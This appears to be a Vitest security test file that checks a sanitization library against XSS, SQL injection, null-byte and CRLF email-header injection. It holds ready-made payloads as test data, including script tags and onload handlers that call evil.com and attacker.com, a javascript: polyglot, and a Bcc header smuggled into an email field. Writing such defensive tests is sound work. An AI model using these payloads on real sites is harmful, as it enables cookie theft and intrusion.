import { describe, it, expect } from "vitest";
import {
  stripHtml,
  sanitizeString,
  escapeHtml,
  sanitizeEmail,
  sanitizeUrl,
} from "@/lib/security/sanitize";

describe("Security Audit: Fuzzing, Sanitization & Injection Defense", () => {
  describe("XSS Injection Defense", () => {
    it("strips active script tags with varying case and whitespace", () => {
      const payloads = [
        "<script>alert('pwned')</script>",
        "<SCRIPT SRC='http://evil.com/xss.js'></SCRIPT>",
        "<ScRiPt>document.cookie</sCrIpT>",
        "<script \n src=evil.js></script>",
      ];

      for (const payload of payloads) {
        const cleaned = stripHtml(payload);
        expect(cleaned).not.toContain("<script");
        expect(cleaned).not.toContain("alert");
        expect(cleaned).not.toContain("document.cookie");
      }
    });

    it("strips event handler attributes like onload, onerror, onclick", () => {
      const payloads = [
        '<img src="x" onerror="alert(1)">',
        '<svg onload="fetch(\'http://attacker.com\')">',
        '<div onclick="evil()">Click me</div>',
        '<body onload=alert(document.domain)>',
      ];

      for (const payload of payloads) {
        const cleaned = stripHtml(payload);
        expect(cleaned).not.toContain("onerror=");
        expect(cleaned).not.toContain("onload=");
        expect(cleaned).not.toContain("onclick=");
      }
    });

    it("strips dangerous URI protocols like javascript: and data:text/html", () => {
      const payloads = [
        "javascript:alert(1)",
        "JavaScript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "vbscript:msgbox(1)",
        "data:text/html,<script>alert(1)</script>",
      ];

      for (const payload of payloads) {
        expect(sanitizeUrl(payload)).toBeNull();
        expect(stripHtml(payload)).not.toMatch(/javascript\s*:/i);
      }
    });

    it("properly escapes HTML entities to neutralize HTML contexts", () => {
      const input = '<div class="alert">& "dangerous" \'quotes\'</div>';
      const escaped = escapeHtml(input);

      expect(escaped).not.toContain("<div");
      expect(escaped).toContain("&lt;div");
      expect(escaped).toContain("&quot;dangerous&quot;");
      expect(escaped).toContain("&#39;quotes&#39;");
      expect(escaped).toContain("&amp;");
    });
  });

  describe("SQL Injection & Null-Byte Defense", () => {
    it("strips null bytes (\\0) to neutralize C-level string termination exploits", () => {
      const input = "admin\0' OR '1'='1";
      const cleaned = sanitizeString(input);
      expect(cleaned).not.toContain("\0");
      expect(cleaned.indexOf("\0")).toBe(-1);
    });

    it("removes non-printable ASCII control characters", () => {
      const input = "clean\x01\x02\x03\x08text\x1Bhere";
      const cleaned = sanitizeString(input);
      expect(cleaned).toBe("cleantexthere");
    });
  });

  describe("CRLF & Email Header Injection Defense", () => {
    it("strips CRLF sequences (\\r\\n) from emails to prevent header injection", () => {
      const dangerousEmail = "attacker@example.com\r\nBcc: victim@example.com";
      const sanitized = sanitizeEmail(dangerousEmail);

      expect(sanitized).not.toContain("\r");
      expect(sanitized).not.toContain("\n");
      expect(sanitized).not.toContain("Bcc:");
    });
  });
});
